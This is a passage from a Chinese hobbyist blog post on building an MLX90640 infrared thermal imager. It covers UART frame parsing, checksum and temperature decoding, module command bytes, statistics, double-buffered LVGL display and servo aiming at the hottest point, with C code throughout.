class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">UART5_IRQHandler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (USART_GetITStatus(UART5, USART_IT_RXNE) != RESET)                <span class="hljs-comment">//  若接收数据寄存器满</span><br>    &#123;<br>        USART_ClearITPendingBit(UART5, USART_IT_RXNE);<br>        Uart5.Rxbuf[Uart5.RXlenth] = USART_ReceiveData(UART5);<br>        <br>        <span class="hljs-keyword">switch</span> (Uart5.RXlenth)<br>        &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span>(Uart5.Rxbuf[<span class="hljs-number">0</span>] != <span class="hljs-number">0x5a</span>)<br>                &#123;<br>                    Uart5.RXlenth = <span class="hljs-number">0</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    Uart5.RXlenth++;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span>(Uart5.Rxbuf[<span class="hljs-number">1</span>] != <span class="hljs-number">0x5a</span>)<br>                &#123;<br>                    Uart5.RXlenth = <span class="hljs-number">0</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    Uart5.RXlenth++;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">if</span>(Uart5.Rxbuf[<span class="hljs-number">2</span>] != <span class="hljs-number">0x02</span>)<br>                &#123;<br>                    Uart5.RXlenth = <span class="hljs-number">0</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                  Uart5.RXlenth++;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">if</span>(Uart5.Rxbuf[<span class="hljs-number">3</span>] != <span class="hljs-number">0x06</span>)<br>                &#123;<br>                    Uart5.RXlenth = <span class="hljs-number">0</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    Uart5.RXlenth++;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Uart5.RXlenth++;<br>                <span class="hljs-keyword">if</span>(Uart5.RXlenth == <span class="hljs-number">1544</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(is_update)&#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1544</span>; i++)<br>                        &#123;<br>                            mlx90640_buf[i] = Uart5.Rxbuf[i];<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(disp_finish_flag)&#123; <span class="hljs-comment">// 显示完成</span><br>                            update_buffer(&amp;mlx90640_buf[<span class="hljs-number">4</span>]); <span class="hljs-comment">// 更新缓冲区</span><br>                            disp_finish_flag = <span class="hljs-number">0</span>;<br>                        &#125;<br>                    &#125;<br>                    Uart5.ReceiveFinish = <span class="hljs-number">1</span>;<br>                    state = <span class="hljs-number">1</span>;<br>                    test &lt; Uart5.RXlenth ? test = Uart5.RXlenth : test;<br>                    Uart5.RXlenth = <span class="hljs-number">0</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>首先判断帧头是否正确，校验帧头，然后判断数据量是否正确，经过计算数据量为1544，转换为16进制为0x0602，若校验失败则舍弃数据，重新开始接收。接收完毕后，将数据存入缓冲区mlx90640_buf，将mlx90640_buf传入update_buffer函数更新显示缓冲区，以便后续显示，最后将接收完成标志位置1，进入数据处理状态。</p><ol start="3" type="1"><li>温度解码</li></ol><figure><img src="/img/基于MLX90640的红外热成像仪/温度矩阵.png"alt="温度矩阵" /><figcaption aria-hidden="true">温度矩阵</figcaption></figure><p>数据放大倍数：<br />100，即实际温度为数据除以100。</p><p>数据解析：</p><ul><li><p>数据帧中，每两个字节表示一个温度值，低位在前。<br /></p></li><li><p>温度值为实际温度的100倍，需除以100得到实际温度。<br /></p></li><li><p>例如一帧数据<br />5A5A-0206-6E0E-690E-5A0E-XXXX-050E-8D0E-D540<br />Byte0~ Byte1---0x5A0x5A 表示帧头；<br />Byte2~ Byte3---0x0206 表示数据量=0x06*256+0x02=1538个温度数据（包括目标数据和MLX90640 自身温度数据）<br />Byte4~ Byte1539---表示上图中768 个点的温度数据，输出顺序一次为(Col 1,Row1)-&gt;(Col 32,Row 1)-&gt;(Col 1,Row 2)-&gt;(Col 32,Row 2)-&gt;(Col1,Row XX)-&gt;(Col 32,Row XX)-&gt;(Col 1,Row 24)-&gt;(Col 32,Row24)<br /></p></li><li><p>例子<br />一帧数据 5A5A-0206-6E0E-690E-5A0E-XXXX-050E-8D0E-D540</p><p><span class="math display">\[  \begin{align*}  T_{Col1, Row1} = \frac{0x0E*256+0x6E}{100} = 36.94 \\  T_{Col2, Row1} = \frac{0x0E*256+0x69}{100} = 36.89 \\  \dots \\  T_{Col32, Row24} = \frac{0x0E*256+0x50}{100} = 36.64  \end{align*}  \]</span></p><p>Byte1540---Byte1541表示MLX90640自身温度数据。</p><p><span class="math display">\[  TA = \frac{0x0E*256+0x8D}{100} = 37.25  \]</span></p><p>Byte1542---Byte1543表示前771个字的累加和, 每个字为16bit。<br />字 1=0x5A5A<br />字2=0x0602(即数据量)<br />字 3=0x0E6E(即点1的温度数据)<br />...<br />字 770=0x0E05(即点768 的温度数据)<br />字 771=0x0E8D(即MLX90640 的温度数据)<br />则<br />校验和=字1+字2+字3+字XX+字700+字771=Byte1543*256+Byte1542</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">Check</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *data)</span><br>&#123;<br>    <span class="hljs-type">uint16_t</span> sum=<span class="hljs-number">0</span>,length=<span class="hljs-number">0</span>,i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint16_t</span> temp=<span class="hljs-number">0</span>;<br>    length=((<span class="hljs-type">uint16_t</span> )mlx90640_buf[<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">8</span>)|mlx90640_buf[<span class="hljs-number">2</span>]+<span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">if</span>(length&gt;<span class="hljs-number">1544</span>)<span class="hljs-comment">//超过上传数据</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;length<span class="hljs-number">-2</span>; i=i+<span class="hljs-number">2</span>)<br>    &#123;<br>        temp=((<span class="hljs-type">uint16_t</span> )mlx90640_buf[i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)|mlx90640_buf[i];<br>        sum+=temp;<br>    &#125;<br>    temp=((<span class="hljs-type">uint16_t</span> )mlx90640_buf[i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)|mlx90640_buf[i];<br>    <span class="hljs-keyword">if</span>(sum==temp)<br>    &#123;<br>        <span class="hljs-comment">// memcpy(data,mlx90640_buf,length);</span><br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;length; i++)<br>        &#123;<br>            data[i]=mlx90640_buf[i];<br>            <span class="hljs-comment">// printf(&quot;%x&quot;, data[i]);</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在代码中定义了一个Check函数，用于校验数据帧的正确性，校验和为前771个字的累加和，若校验和与最后两个字节相等，则校验成功，返回1，否则返回0，在串口数据接收完成后，在处理数据之前调用Check函数进行校验。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">temp=((<span class="hljs-type">int16_t</span>)data_buf[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+<span class="hljs-number">4</span>]&lt;&lt;<span class="hljs-number">8</span>|data_buf[i*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>]);<br>Temperature=(<span class="hljs-type">float</span>)temp * <span class="hljs-number">0.01f</span>;<br></code></pre></td></tr></table></figure><p>之后我们将数据解析为实际温度，即将两个字节的数据转换为实际温度，如上所示，将两个字节的数据转换为16位整型，然后乘以0.01即可得到实际温度，通过这种方式解析数据，我们可以得到一个32*24的温度矩阵。</p><ol start="4" type="1"><li>指令</li></ol><p>发给模块的指令为四字节：<br />波特率设置指令：</p><ul><li>9600 设置指令-----------0xA5+0x15+0x01+0xBB<br /></li><li>115200 设置指令---------0xA5+0x15+0x02+0xBC<br /></li><li>460800 设置指令---------0xA5+0x15+0x03+0xBD</li></ul><p>模块更新频率设置指令：</p><ul><li>0.5hz 设置指令---------0xA5+0x25+0x00+0xCA<br /></li><li>1hz 设置指令-----------0xA5+0x25+0x01+0xCB<br /></li><li>2hz 设置指令-----------0xA5+0x25+0x02+0xCC<br /></li><li>4hz 设置指令-----------0xA5+0x25+0x03+0xCD<br /></li><li>8hz 设置指令-----------0xA5+0x25+0x04+0xCE</li></ul><p>自动/查询设置指令：</p><ul><li>查询输出数据指令-------0xA5+0x35+0x01+0xDB<br /></li><li>自动输出数据指令-------0xA5+0x35+0x02+0Xdc<br /></li><li>发射率设置指令: 0xA5+0x45+0xXX+sum(8bit校验和)</li></ul><p>保存设置指令：</p><ul><li>保存设置指令-------------0xA5+0x65+0x01+0x0B<br /></li><li>保存设置指令：表示将当前的波特率设置、模块更新频率设置、自动/查询和发射率设置保存到flash中，重启后按照保存的设置运行。</li></ul><p>I2C模式, 把模块PS接GND或者SET点焊接即可。</p><p>I2C驱动代码太长，这里不再赘述，可以在github<ahref="https://github.com/symcreg/lvgl_mlx90640/blob/main/BaseDrive/MLX90640_API.c">这里</a>和<ahref="https://github.com/symcreg/lvgl_mlx90640/blob/main/BaseDrive/MLX90640_I2C_Driver.c">这里</a>查看源码。</p><h4 id="数据处理">6.1.2 数据处理</h4><h5 id="温度统计">温度统计</h5><p>我们可以通过统计温度矩阵中的数据，得到一些有用的信息，如最高温度、最低温度等，这里我们主要关注以下几个数据：</p><ul><li>最高温度：统计温度矩阵中的最大值。<br /></li><li>最低温度：统计温度矩阵中的最小值。<br /></li><li>平均温度：统计温度矩阵中的平均值。<br /></li><li>温度方差：统计温度矩阵中的方差。<br /></li><li>温度分布：绘制温度直方图，显示温度分布情况。</li></ul><p>最高温度、最低温度很容易统计，只需要遍历温度矩阵，找到最大值和最小值即可。为了提高效率，我们可以在数据接收完成后，在计算温度时直接统计最高温度和最低温度，然后在显示时直接显示，这样就不再需要重新遍历温度矩阵。</p><p>通常情况下，平均温度和方差的计算需要遍历温度矩阵，计算平均值和方差。这里我们可以使用增量法计算平均值和方差，这样可以减少遍历次数，一边遍历一边计算，提高效率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">768</span>;)<br>&#123;<br>    <span class="hljs-comment">// 增量法计算均值和方差</span><br>    temp=((<span class="hljs-type">int16_t</span>)data_buf[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+<span class="hljs-number">4</span>]&lt;&lt;<span class="hljs-number">8</span>|data_buf[i*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>]);<br>    Temperature=(<span class="hljs-type">float</span>)temp * <span class="hljs-number">0.01f</span>;<br>    delta = Temperature - mean_temp;<br>    mean_temp += delta / (i + <span class="hljs-number">1</span>);<br>    variance_temp += delta * (Temperature - mean_temp);<br>    <br>    <span class="hljs-keyword">if</span>(Temperature&gt;max_temp)&#123;<br>        max_temp_x = i % <span class="hljs-number">32</span>;<br>        max_temp_y = i / <span class="hljs-number">32</span>;<br>        max_temp=Temperature;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(Temperature&lt;min_temp)&#123;<br>        min_temp_x = i % <span class="hljs-number">32</span>;<br>        min_temp_y = i / <span class="hljs-number">32</span>;<br>        min_temp=Temperature;<br>    &#125;<br>    i++;<br>    <span class="hljs-comment">// 将竖行的数据加起来</span><br>    chart_cnt[i%<span class="hljs-number">32</span>] += Temperature;<br>&#125;<br>variance_temp /= <span class="hljs-number">768</span>;<br></code></pre></td></tr></table></figure><p>我们定义了chart_cnt数组，用于存储每一列的温度值，然后在遍历温度矩阵的过程中，将每一列的温度值加起来，这样就可以得到每一列的温度总和，然后在显示直方图时，只需要将chart_cnt数组中的数据绘制出来即可。</p><p>但是屏幕分辨率有限，我们无法将所有的温度值都显示出来，所以我们需要对温度值进行映射，将温度值映射到屏幕上，这样就可以显示出温度分布情况，也就是对温度值进行归一化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">uint8_t</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>    <span class="hljs-keyword">if</span>(max_chart_cnt &lt; chart_cnt[i])&#123;<br>        max_chart_cnt = chart_cnt[i];<br>    &#125;<br>    <span class="hljs-keyword">if</span>(min_chart_cnt &gt; chart_cnt[i])&#123;<br>        min_chart_cnt = chart_cnt[i];<br>    &#125;<br>&#125;<br><span class="hljs-comment">// reset</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">uint8_t</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>    chart_data[i] = myMap(chart_cnt[i], min_chart_cnt, max_chart_cnt, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>);<br>    <span class="hljs-keyword">if</span>(chart_max_value &lt; chart_data[i])&#123;<br>        chart_max_value = chart_data[i];<br>        <span class="hljs-comment">// chart_max_x = 10 + i * 310 / CHART_SIZE;</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(chart_min_value &gt; chart_data[i])&#123;<br>        chart_min_value = chart_data[i];<br>    &#125;<br>    chart_cnt[i] = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先找到chart_cnt数组中的最大值和最小值，然后将chart_cnt数组中的数据映射到0-90之间，这样就可以将温度值映射到屏幕上，然后在显示时，只需要将chart_data数组中的数据绘制出来即可。</p><p>其中myMap函数为映射函数，用于将数据映射到指定范围内，如下所示：<br /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">float</span> <span class="hljs-title function_">myMap</span><span class="hljs-params">(<span class="hljs-type">float</span> x, <span class="hljs-type">float</span> in_min, <span class="hljs-type">float</span> in_max, <span class="hljs-type">float</span> out_min, <span class="hljs-type">float</span> out_max)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>这样我们就可以得到温度分布的直方图，显示温度分布情况。</p><h5 id="热成像显示">热成像显示</h5><p>我们可以通过LVGL库绘制热成像图，将温度矩阵中的数据映射到屏幕上，这样就可以显示出热成像图。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update_buffer</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* src)</span>&#123;<br>    <span class="hljs-keyword">if</span>(updating_buffer_flag == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">memcpy</span>(buffer_a, src, SRC_WIDTH * SRC_HEIGHT * <span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memcpy</span>(buffer_b, src, SRC_WIDTH * SRC_HEIGHT * <span class="hljs-number">2</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里引入了双缓冲机制，我们定义两个缓冲区buffer_a和buffer_b，一个用于显示，一个用于更新，这样可以避免显示时的闪烁问题。将显示和更新解耦，通过disp_finish_flag和updating_buffer_flag两个flag来标记当前状态，完成绘制操作后，将更新缓冲区中的数据拷贝到显示缓冲区中，然后再绘制显示缓冲区中的数据，这样就可以实现无闪烁的显示效果。为了提高显示效率，我们不进行拷贝操作，而是交换缓冲区，直接更新显示缓冲区的指针，这样就可以直接绘制更新缓冲区中的数据。</p><figure><img src="/img/基于MLX90640的红外热成像仪/double_buffer.png"alt="double_buffer" /><figcaption aria-hidden="true">double_buffer</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">lv_img_dsc_t</span> dynamic_img_dsc = &#123;<br>    .header.always_zero = <span class="hljs-number">0</span>,<br>    .header.w = SRC_WIDTH,<br>    .header.h = SRC_HEIGHT,<br>    .header.cf = LV_IMG_CF_TRUE_COLOR,<br>    .data = (<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)buffer_b,  <span class="hljs-comment">// 初始使用 buffer_b</span><br>    .data_size = SRC_WIDTH * SRC_HEIGHT * <span class="hljs-number">2</span>,<br>&#125;; <span class="hljs-comment">// 图片描述符</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_dynamic_image</span><span class="hljs-params">(<span class="hljs-type">lv_obj_t</span>* parent)</span>&#123;<br>    <span class="hljs-type">lv_obj_t</span>* img = lv_img_create(parent);<br>    lv_img_set_src(img, &amp;dynamic_img_dsc);<br>    lv_img_set_zoom(img, <span class="hljs-number">256</span> * <span class="hljs-number">8</span>);<br>    lv_obj_align(img, LV_ALIGN_TOP_LEFT, <span class="hljs-number">144</span>, <span class="hljs-number">115</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">swap_buffers</span><span class="hljs-params">(<span class="hljs-type">lv_obj_t</span>* img)</span>&#123;<br>    <span class="hljs-keyword">if</span>(updating_buffer_flag == <span class="hljs-number">0</span>)&#123;<br>        dynamic_img_dsc.data = (<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)buffer_b;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        dynamic_img_dsc.data = (<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)buffer_a;<br>    &#125;<br>    lv_img_set_src(img, &amp;dynamic_img_dsc);<br>    <span class="hljs-comment">// 更新图像源，并刷新</span><br>    lv_obj_invalidate(img);<br><br>    updating_buffer_flag = !updating_buffer_flag;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义一个dynamic_img_dsc结构体，用于描述图片，在create_dynamic_image函数中创建图片对象，然后在swap_buffers函数中交换缓冲区，更新图片源，然后刷新图片对象，实现热成像图的实时显示。</p><h5 id="瞄准角度计算">瞄准角度计算</h5><p>我们可以通过舵机模块，实现瞄准功能，将最高温度点对准中心，这样就可以实现瞄准功能。</p><p>计算瞄准角度也很简单，只需要将最高温度点的坐标映射到舵机的角度范围内即可。</p><p>这里使用的是SG90舵机，工作范围为0-90度，所以我们需要将最高温度点的坐标映射到0-90度之间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SetServoAngle(<span class="hljs-number">0</span>, <span class="hljs-number">90</span> * (<span class="hljs-type">float</span>)chart_max_x / <span class="hljs-number">320</span>);<br>SetServoAngle(<span class="hljs-number">1</span>, <span class="hljs-number">45</span> * (<span class="hljs-type">float</span>)chart_max_y / <span class="hljs-number">240</span>);<br></code></pre></td></tr></table></figure><p>其中SetServoAngle函数用于设置舵机的角度，第一个参数为舵机的编号，第二个参数为舵机的角度，而chart_max_x和chart_max_y为最高温度点的坐标，将其映射到0-90度之间，然后设置舵机的角度即可。</p><h3 id="图形界面设计">6.2 图形界面设计</h3><p>我们使用LVGL库绘制图形界面，实现热成像图的显示、温度统计信息的显示、温度直方图的显示、舵机瞄准示意图的显示等功能。</p><h4 id="界面布局">6.2.1 界面布局</h4><p>这里的LCD显示屏为4.3英寸，分辨率为800 x480，我们可以将界面分为几个部分：</p><ul><li>热成像图：显示实时热成像图，位于左上角，大小为320 x 240。<br /></li><li>温度直方图：显示温度分布情况，位于屏幕左下角，大小为320 x240。<br /></li><li>温度信息：显示最高温度、最低温度、平均温度、方差等信息，位于屏幕右下角。<br /></li><li>舵机瞄准：显示舵机瞄准示意图，位于屏幕右上角，大小为320 x240，使用两直线表示舵机的角度。</li></ul><p>再设置两个菜单按钮，用于切换显示模式，控制显示参数。</p><p>示意图如下：</p><figure><img src="/img/基于MLX90640的红外热成像仪/layout.png" alt="layout" /><figcaption aria-hidden="true">layout</figcaption></figure><h4 id="控件设计">6.2.2 控件设计</h4><p>简单确定了界面布局后，我们就可以开始设计控件了，这里我们主要使用以下控件：</p><ul><li>图片控件：用于显示热成像图和舵机瞄准示意图。<br /></li><li>图表控件：用于显示温度直方图。<br /></li><li>文本控件：用于显示温度信息。<br /></li><li>按键控件：用于切换显示模式。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">create_dynamic_image</span><span class="hljs-params">(<span class="hljs-type">lv_obj_t</span>* parent)</span>&#123;<br>    <span class="hljs-type">lv_obj_t</span>* img = lv_img_create(parent);<br>    lv_img_set_src(img, &amp;dynamic_img_dsc);<br>    lv_img_set_zoom(img, <span class="hljs-number">256</span> * <span class="hljs-number">8</span>);<br>    lv_obj_align(img, LV_ALIGN_TOP_LEFT, <span class="hljs-number">144</span>, <span class="hljs-number">115</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中dynamic_img_dsc上文已经定义，用于描述图片，然后在create_dynamic_image函数中创建图片对象，用于显示热成像图，使用lv_img_set_src函数设置图片源，lv_img_set_zoom函数设置图片缩放比例，最后使用lv_obj_align函数设置图片位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">create_image_chart</span><span class="hljs-params">()</span>&#123;<br>    chart = lv_chart_create(lv_scr_act());<br>    lv_chart_set_type(chart, LV_CHART_TYPE_BAR);<br>    lv_chart_set_point_count(chart, CHART_SIZE);<br>    lv_obj_set_style_pad_column(chart, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    lv_obj_set_size(chart, <span class="hljs-number">320</span>, <span class="hljs-number">200</span>);<br>    lv_obj_set_style_bg_color(chart, lv_color_hex(<span class="hljs-number">0xE6E6FA</span>), LV_PART_MAIN);<br>    <span class="hljs-comment">//lv_obj_align(chart, LV_ALIGN_BOTTOM_LEFT, 0, 0);</span><br>    lv_obj_set_pos(chart, <span class="hljs-number">0</span>, <span class="hljs-number">240</span>);<br>ser = lv_chart_add_series(chart, lv_color_hex(<span class="hljs-number">0xff0000</span>), LV_CHART_AXIS_PRIMARY_Y);<br>    lv_obj_add_event_cb(chart, chart_draw_event_cb, LV_EVENT_DRAW_PART_BEGIN, ser);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint16_t</span> i = <span class="hljs-number">0</span>; i &lt; CHART_SIZE; i++) &#123;<br>        lv_chart_set_next_value(chart, ser, <span class="hljs-number">0</span>);<br>    &#125;<br>    lv_timer_create(update_chart_task, UPDATE_TIME, chart);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用lv_chart_create函数创建图片空间，简单设置了一些属性，如图表类型、点数、背景颜色等，然后使用lv_chart_add_series函数添加一个数据系列，通过lv_chart_set_next_value函数设置数据，这里我们通过lv_timer_create函数创建一个定时器，定时更新图表数据。</p><p>为了实现温度直方图的颜色渐变效果，我们需要在lv_obj_add_event_cb函数中添加一个事件回调函数，用于绘制图表，如下所示：<br /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">chart_draw_event_cb</span><span class="hljs-params">(<span class="hljs-type">lv_event_t</span> * e)</span>&#123;<br>    <span class="hljs-type">lv_obj_draw_part_dsc_t</span>* chart_dsc = lv_event_get_draw_part_dsc(e);<br>    <span class="hljs-comment">/* 检查绘制的部分是否是柱状条 */</span><br>    <span class="hljs-keyword">if</span> (chart_dsc-&gt;part == LV_PART_ITEMS) &#123;<br>        <span class="hljs-type">uint16_t</span> index = chart_dsc-&gt;id; <span class="hljs-comment">// 获取当前柱子的索引</span><br>        <span class="hljs-type">lv_coord_t</span> value = chart_dsc-&gt;value; <span class="hljs-comment">// 获取当前柱子的值</span><br>        <span class="hljs-comment">/* 根据值设置不同颜色 */</span><br>        <span class="hljs-comment">// uint16_t ratio = value * 255 / 100;</span><br>        <span class="hljs-comment">// chart_dsc-&gt;rect_dsc-&gt;bg_color = lv_color_make(ratio, 0, (255-ratio)/2);</span><br>chart_dsc-&gt;rect_dsc-&gt;bg_color = map_temperature_to_color(value, chart_min_value, chart_max_value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>这样就能根据温度值设置不同的颜色，更容易区分温度分布情况。</p><figure><img src="/img/基于MLX90640的红外热成像仪/chart.png" alt="chart" 